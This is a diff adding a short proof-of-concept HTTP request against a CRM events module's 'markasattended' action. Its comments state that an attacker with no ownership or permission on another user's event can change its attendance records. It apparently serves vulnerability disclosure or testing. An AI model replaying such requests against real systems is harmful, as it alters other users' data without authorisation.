@@ -1,0 +1,10 @@
+POST /index.php?module=FP_events&action=markasattended HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker session>
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:33116/index.php?module=FP_events&action=DetailView&record=0bf66c8a-b226-443d-9f1b-e96de4cba006
+
+event_id=0bf66c8a-b226-443d-9f1b-e96de4cba006&id=2ce1c4ac-0032-4f03-a714-720fbaa34baf&entire_list=0
+
+# Attacker A (mod_94527436) is not the organiser, not a delegate,
+# and has no ACL/ownership relation to event 0bf66c8a-b226-443d-9f1b-e96de4cba006 (owned by V).
